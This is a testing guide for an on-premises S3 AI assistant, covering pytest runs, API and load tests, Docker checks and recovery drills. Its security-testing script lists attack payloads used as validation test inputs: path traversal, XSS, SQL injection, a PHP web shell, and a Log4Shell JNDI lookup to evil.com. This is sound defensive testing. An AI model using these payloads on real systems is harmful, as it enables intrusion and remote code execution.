# S3 On-Premises AI Assistant - Testing Guide v2.2.7

Complete testing guide for the S3 AI Assistant covering unit tests, integration tests, performance tests, and system validation.

## Table of Contents

1. [Quick Test Overview](#quick-test-overview)
2. [Environment Setup for Testing](#environment-setup-for-testing)
3. [Running the Test Suite](#running-the-test-suite)
4. [Manual Testing](#manual-testing)
5. [Performance Testing](#performance-testing)
6. [Security Testing](#security-testing)
7. [Docker Testing](#docker-testing)
8. [API Testing](#api-testing)
9. [UI Testing](#ui-testing)
10. [Troubleshooting Tests](#troubleshooting-tests)

## Quick Test Overview

### Comprehensive Test Runner

The fastest way to test everything:

```bash
# Run all tests with our comprehensive test runner
python3 run_tests.py
```

This script runs:
- Environment validation
- Security feature verification
- Configuration management tests
- API functionality tests
- Docker setup validation
- Unit test suite
- Documentation checks

### Expected Output

```
S3 On-Premises AI Assistant - Test Suite v2.2.7
Security Enhanced & Production Ready

============================================================
                    ENVIRONMENT SETUP                     
============================================================
[PASS] Python Version 3.9.5
[PASS] File exists: api.py
[PASS] File exists: config.py
[PASS] Syntax check: api.py
[PASS] Syntax check: config.py

============================================================
                    SECURITY FEATURES                     
============================================================
[PASS] Import validation module
[PASS] Directory traversal detection
[PASS] XSS detection
[PASS] Secure deserialization

============================================================
                     TEST SUMMARY                        
============================================================
Total Tests: 15
Passed: 15
Failed: 0
Duration: 8.45 seconds

ALL TESTS PASSED! Ready for release!
```

## Environment Setup for Testing

### Prerequisites

```bash
# Ensure Python dependencies are installed
pip install -r requirements.txt

# Install additional testing tools
pip install pytest pytest-cov requests httpx

# Verify Ollama is installed and running
curl http://localhost:11434/api/tags

# Pull required model
ollama pull phi3:mini
```

### Test Environment Variables

```bash
# Set test configuration
export S3AI_LOG_LEVEL=DEBUG
export S3AI_DEBUG_MODE=true
export S3AI_OLLAMA_BASE_URL=http://localhost:11434
export S3AI_LLM_MODEL=phi3:mini
```

## Running the Test Suite

### 1. Comprehensive Test Runner

```bash
# Run all tests
python3 run_tests.py

# Run with verbose output
python3 run_tests.py --verbose
```

### 2. Individual Test Categories

```bash
# Unit tests only
python -m pytest tests/ -v

# Security tests
python -m pytest tests/test_validation.py -v

# API tests
python -m pytest tests/test_api.py -v

# With coverage report
python -m pytest tests/ --cov=. --cov-report=html
```

### 3. Specific Test Functions

```bash
# Test input validation
python -m pytest tests/test_validation.py::test_safe_query_valid -v

# Test API endpoints
python -m pytest tests/test_api.py::test_health_endpoint -v

# Test security features
python -m pytest tests/test_validation.py::test_directory_traversal_attack -v
```

## Manual Testing

### 1. System Components Test

#### Test Model Loading
```bash
# Test model cache functionality
python3 -c "
from model_cache import ModelCache
import time

print('Testing model loading...')
start = time.time()
llm = ModelCache.get_llm()
print(f'LLM loaded in {time.time() - start:.2f}s')

start = time.time()
vector_store = ModelCache.get_vector_store()
print(f'Vector store loaded in {time.time() - start:.2f}s')

print('Health check:', ModelCache.health_check())
"
```

#### Test Configuration
```bash
# Test configuration loading
python3 -c "
from config import AppConfig
config = AppConfig()
print('Configuration loaded successfully')
print(f'LLM Model: {config.llm_model}')
print(f'Ollama URL: {config.ollama_base_url}')
print(f'Max Query Length: {config.max_query_length}')
"
```

#### Test Document Loading
```bash
# Test document processing
python3 -c "
from utils import load_documents_from_path
docs = load_documents_from_path('docs')
print(f'Loaded {len(docs)} documents')
for i, doc in enumerate(docs[:3]):
    print(f'Doc {i+1}: {len(doc.page_content)} characters')
"
```

### 2. Search System Test

#### Test Quick Bucket Search
```bash
# Test bucket index functionality
python3 -c "
from bucket_index import bucket_index
result = bucket_index.quick_search('dept: engineering')
print('Quick search result:')
print(result[:200] + '...' if len(result) > 200 else result)
"
```

#### Test Vector Search
```bash
# Test vector similarity search
python3 -c "
from model_cache import ModelCache
vector_store = ModelCache.get_vector_store()
retriever = vector_store.as_retriever(search_kwargs={'k': 3})
docs = retriever.get_relevant_documents('S3 bucket configuration')
print(f'Found {len(docs)} relevant documents')
for i, doc in enumerate(docs):
    print(f'Doc {i+1}: {doc.page_content[:100]}...')
"
```

### 3. Security Validation Test

#### Test Input Validation
```bash
# Test validation functions
python3 -c "
from validation import safe_query, safe_filename, ValidationError

test_cases = [
    'normal query about buckets',
    '../../../etc/passwd',
    '<script>alert(\"xss\")</script>',
    'a' * 3000,  # Too long
    ''  # Empty
]

for test in test_cases:
    try:
        result = safe_query(test)
        print(f'PASS: \"{test[:30]}...\" -> Valid')
    except ValidationError as e:
        print(f'BLOCK: \"{test[:30]}...\" -> {e}')
"
```

## Performance Testing

### 1. Response Time Testing

```bash
# Test API response times
python3 -c "
import time
import requests

# Test health endpoint
start = time.time()
response = requests.get('http://localhost:8000/health')
health_time = time.time() - start
print(f'Health check: {health_time:.3f}s - {response.status_code}')

# Test query endpoint
start = time.time()
response = requests.post('http://localhost:8000/ask', 
    json={'question': 'show buckets under dept: engineering'})
query_time = time.time() - start
print(f'Query response: {query_time:.3f}s - {response.status_code}')

if response.status_code == 200:
    data = response.json()
    print(f'Response source: {data.get(\"source\")}')
    print(f'Server timing: {data.get(\"response_time\"):.3f}s')
"
```

### 2. Load Testing

```bash
# Simple concurrent request test
python3 -c "
import asyncio
import aiohttp
import time

async def test_request(session, url):
    async with session.post(url, 
        json={'question': 'test query'}) as response:
        return await response.json()

async def load_test():
    url = 'http://localhost:8000/ask'
    start = time.time()
    
    async with aiohttp.ClientSession() as session:
        tasks = [test_request(session, url) for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    duration = time.time() - start
    successful = sum(1 for r in results if not isinstance(r, Exception))
    print(f'Load test: {successful}/10 successful in {duration:.2f}s')
    print(f'Average: {duration/10:.3f}s per request')

asyncio.run(load_test())
"
```

### 3. Memory Usage Testing

```bash
# Monitor memory usage during operation
python3 -c "
import psutil
import time
from model_cache import ModelCache

process = psutil.Process()
print(f'Initial memory: {process.memory_info().rss / 1024 / 1024:.1f} MB')

# Load models
ModelCache.get_llm()
print(f'After LLM load: {process.memory_info().rss / 1024 / 1024:.1f} MB')

ModelCache.get_vector_store()
print(f'After vector store: {process.memory_info().rss / 1024 / 1024:.1f} MB')
"
```

## Security Testing

### 1. Input Validation Testing

```bash
# Test malicious input handling
python3 tests/security_manual_test.py
```

Create `tests/security_manual_test.py`:
```python
#!/usr/bin/env python3
"""Manual security testing script"""

import requests
from validation import safe_query, ValidationError

def test_api_security():
    """Test API security measures"""
    malicious_inputs = [
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "<?php system($_GET['cmd']); ?>",
        "\x00\x01\x02\x03",  # Null bytes
        "a" * 5000,  # Oversized input
    ]
    
    print("Testing API Security...")
    for payload in malicious_inputs:
        try:
            response = requests.post(
                'http://localhost:8000/ask',
                json={'question': payload},
                timeout=5
            )
            if response.status_code == 400:
                print(f"PASS: Blocked malicious input: {payload[:30]}...")
            else:
                print(f"WARN: Accepted input: {payload[:30]}... (Status: {response.status_code})")
        except Exception as e:
            print(f"ERROR: {e}")

def test_validation_security():
    """Test validation functions"""
    print("\nTesting Validation Security...")
    
    dangerous_inputs = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/}",
        "eval(base64_decode($_POST['cmd']))",
    ]
    
    for dangerous in dangerous_inputs:
        try:
            safe_query(dangerous)
            print(f"FAIL: Validation allowed: {dangerous}")
        except ValidationError:
            print(f"PASS: Validation blocked: {dangerous[:30]}...")

if __name__ == "__main__":
    test_validation_security()
    test_api_security()
```

### 2. Rate Limiting Testing

```bash
# Test rate limiting
python3 -c "
import requests
import time

print('Testing rate limiting...')
for i in range(35):  # Exceed 30/minute limit
    try:
        response = requests.get('http://localhost:8000/health', timeout=2)
        if response.status_code == 429:
            print(f'Rate limit triggered at request {i+1}')
            break
        elif i % 5 == 0:
            print(f'Request {i+1}: {response.status_code}')
    except Exception as e:
        print(f'Request {i+1}: Error - {e}')
    time.sleep(0.1)
"
```

## Docker Testing

### 1. Container Build Testing

```bash
# Test Docker build
docker build -t s3ai-test .

# Test container startup
docker run --rm -d --name s3ai-test-container \
  -p 8001:8000 \
  -e S3AI_DEBUG_MODE=true \
  s3ai-test

# Wait for startup
sleep 10

# Test container health
curl http://localhost:8001/health

# Cleanup
docker stop s3ai-test-container
docker rmi s3ai-test
```

### 2. Docker Compose Testing

```bash
# Test full Docker Compose stack
docker-compose -f docker-compose.yml up -d

# Wait for services to start
sleep 30

# Test services
echo "Testing Ollama..."
curl http://localhost:11434/api/tags

echo "Testing API..."
curl http://localhost:8000/health

echo "Testing UI accessibility..."
curl -I http://localhost:8501

# Cleanup
docker-compose down
```

### 3. Production Profile Testing

```bash
# Test production configuration
docker-compose --profile production up -d

# Test with monitoring
docker-compose --profile production --profile monitoring up -d

# Check all services
docker-compose ps

# Cleanup
docker-compose --profile production --profile monitoring down
```

## API Testing

### 1. Endpoint Testing

```bash
# Health endpoint
curl -X GET http://localhost:8000/health | jq

# Ask endpoint with valid query
curl -X POST http://localhost:8000/ask \
  -H "Content-Type: application/json" \
  -d '{"question": "show buckets under dept: engineering"}' | jq

# Cache management
curl -X POST http://localhost:8000/cache/clear | jq
curl -X GET http://localhost:8000/cache/stats | jq

# Metrics endpoint
curl -X GET http://localhost:8000/metrics | jq
```

### 2. API Error Handling Testing

```bash
# Test invalid JSON
curl -X POST http://localhost:8000/ask \
  -H "Content-Type: application/json" \
  -d '{"invalid": json}' -v

# Test missing fields
curl -X POST http://localhost:8000/ask \
  -H "Content-Type: application/json" \
  -d '{}' -v

# Test malformed requests
curl -X POST http://localhost:8000/ask \
  -H "Content-Type: text/plain" \
  -d 'not json' -v
```

### 3. API Authentication Testing (Future)

```bash
# Test without authentication (should work)
curl -X GET http://localhost:8000/health

# Test with invalid token (should work for now, log warning)
curl -X GET http://localhost:8000/health \
  -H "Authorization: Bearer invalid-token"
```

## UI Testing

### 1. Streamlit Functionality Testing

Start the Streamlit UI and test manually:

```bash
streamlit run streamlit_ui.py --server.port 8501
```

#### Test Checklist:
- [ ] Page loads without errors
- [ ] Sidebar displays system status
- [ ] File upload functionality works
- [ ] Embeddings build button functions
- [ ] Query input accepts text
- [ ] Results display properly
- [ ] Performance metrics show
- [ ] Cache management works
- [ ] Query history maintains

### 2. UI Accessibility Testing

```bash
# Test UI accessibility
curl -I http://localhost:8501

# Test static assets
curl -I http://localhost:8501/static/css/bootstrap.min.css
```

### 3. UI Performance Testing

Monitor UI response times and resource usage during operation.

## Troubleshooting Tests

### 1. Common Issue Simulation

#### Test Missing Model
```bash
# Remove model temporarily
ollama rm phi3:mini 2>/dev/null || true

# Test system behavior
python3 -c "
try:
    from model_cache import ModelCache
    llm = ModelCache.get_llm()
    print('ERROR: Should have failed')
except Exception as e:
    print(f'PASS: Correctly failed with: {e}')
"

# Restore model
ollama pull phi3:mini
```

#### Test Missing Documents
```bash
# Backup and remove docs
mv docs docs_backup 2>/dev/null || true
mkdir docs

# Test system behavior
python3 -c "
from utils import load_documents_from_path
docs = load_documents_from_path('docs')
print(f'Empty docs directory handled: {len(docs)} documents')
"

# Restore docs
rm -rf docs
mv docs_backup docs 2>/dev/null || true
```

#### Test Corrupted Vector Store
```bash
# Backup and corrupt vector store
mv s3_all_docs s3_all_docs_backup 2>/dev/null || true
mkdir s3_all_docs
echo "corrupted" > s3_all_docs/index.faiss

# Test system behavior
python3 -c "
try:
    from model_cache import ModelCache
    vs = ModelCache.get_vector_store()
    print('ERROR: Should have failed')
except Exception as e:
    print(f'PASS: Correctly failed with: {e}')
"

# Restore vector store
rm -rf s3_all_docs
mv s3_all_docs_backup s3_all_docs 2>/dev/null || true
```

### 2. Performance Degradation Testing

```bash
# Test with large query
python3 -c "
import requests
large_query = 'test query ' * 100
try:
    response = requests.post('http://localhost:8000/ask',
        json={'question': large_query}, timeout=10)
    if response.status_code == 400:
        print('PASS: Large query rejected')
    else:
        print(f'Response: {response.status_code}')
except Exception as e:
    print(f'Error: {e}')
"
```

### 3. Recovery Testing

```bash
# Test cache recovery
python3 -c "
from response_cache import response_cache
response_cache.clear_expired()
print('Cache cleared successfully')
"

# Test model cache recovery
python3 -c "
from model_cache import ModelCache
ModelCache.clear_cache()
print('Model cache cleared')
llm = ModelCache.get_llm()
print('Models reloaded successfully')
"
```

## Test Results Interpretation

### Success Indicators

**All Systems Green:**
- All unit tests pass
- API responds within 3 seconds
- Security validation blocks malicious input
- Docker containers start successfully
- UI loads and functions properly

**Performance Benchmarks:**
- Health check: < 0.1s
- Cached queries: < 0.05s
- Quick search: < 0.5s
- Vector search: < 3s
- Memory usage: < 2GB

**Security Validation:**
- Malicious input blocked
- Rate limiting active
- File validation working
- Path traversal prevented

### Failure Indicators

**Critical Issues:**
- Model loading failures
- Security validation bypass
- API returning 500 errors
- Memory leaks or excessive usage

**Performance Issues:**
- Responses taking > 10s
- Memory usage > 4GB
- High error rates
- Cache hit rate < 30%

## Continuous Testing

### Automated Test Schedule

```bash
# Daily health check script
#!/bin/bash
# daily_health_check.sh

echo "$(date): Running daily health check"

# Run comprehensive tests
python3 run_tests.py > test_results.log 2>&1

if [ $? -eq 0 ]; then
    echo "$(date): All tests passed" >> health_check.log
else
    echo "$(date): Tests failed - check test_results.log" >> health_check.log
    # Send alert (email, slack, etc.)
fi

# Check system resources
echo "Memory usage: $(free -h | grep Mem | awk '{print $3}')" >> health_check.log
echo "Disk usage: $(df -h | grep '/$' | awk '{print $5}')" >> health_check.log
```

### Monitoring Integration

```bash
# Add to crontab for regular testing
# 0 2 * * * /path/to/daily_health_check.sh
# 0 */6 * * * curl -f http://localhost:8000/health || echo "Health check failed"
```

## Test Documentation

### Recording Test Results

```bash
# Generate test report
python3 run_tests.py > test_report_$(date +%Y%m%d_%H%M%S).txt

# Generate coverage report
python -m pytest tests/ --cov=. --cov-report=html
# View report at htmlcov/index.html
```

### Test Environment Documentation

Create `test_environment.md` documenting:
- Test system specifications
- Test data used
- Expected vs actual results
- Performance baselines
- Known issues and workarounds

---

## Summary

This comprehensive testing guide covers:

- **Quick automated testing** with `run_tests.py`
- **Unit and integration tests** with pytest
- **Manual testing procedures** for all components
- **Performance and load testing** scripts
- **Security validation testing** procedures
- **Docker and deployment testing** workflows
- **Troubleshooting and recovery testing** scenarios

**Remember:** Regular testing ensures system reliability and catches issues before they impact users. Run the comprehensive test suite before any deployment or release.

For issues or questions about testing, refer to the [troubleshooting guide](DEPLOYMENT.md#troubleshooting) or create an issue on GitHub.